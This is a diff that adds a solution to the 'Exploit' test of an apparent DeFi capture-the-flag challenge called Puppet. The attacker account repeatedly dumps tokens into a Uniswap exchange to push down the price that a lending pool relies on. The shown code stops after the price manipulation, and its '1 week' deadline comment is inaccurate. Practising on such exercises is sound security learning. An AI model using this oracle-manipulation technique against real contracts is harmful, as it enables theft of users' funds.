@@ -104,6 +104,38 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        let ERC20ToSell = ethers.utils.parseEther('100');
+        let value = await this.uniswapExchange.getEthToTokenInputPrice(
+            ERC20ToSell,
+            { gasLimit: 1e6 }
+        )
+
+        for (let i=0; i<10; i++) {
+
+            console.log("ERC20/ETH before: " + ethers.utils.formatEther(value));
+
+            await this.token.connect(attacker)
+            .approve(
+                this.uniswapExchange.address,
+                ERC20ToSell,
+            )
+
+            let blockTimestamp = (await ethers.provider.getBlock("latest")).timestamp
+            await this.uniswapExchange.connect(attacker)
+            .tokenToEthSwapInput(
+                ERC20ToSell,
+                ethers.utils.parseEther('0.1'), //min price
+                blockTimestamp*2, //1 week
+            )
+
+            value = await this.uniswapExchange.getEthToTokenInputPrice(
+                ERC20ToSell,
+                { gasLimit: 1e6 }
+            )
+            console.log("ERC20/ETH after: " + ethers.utils.formatEther(value));
+        }
+        
+
     });
 
     after(async function () {
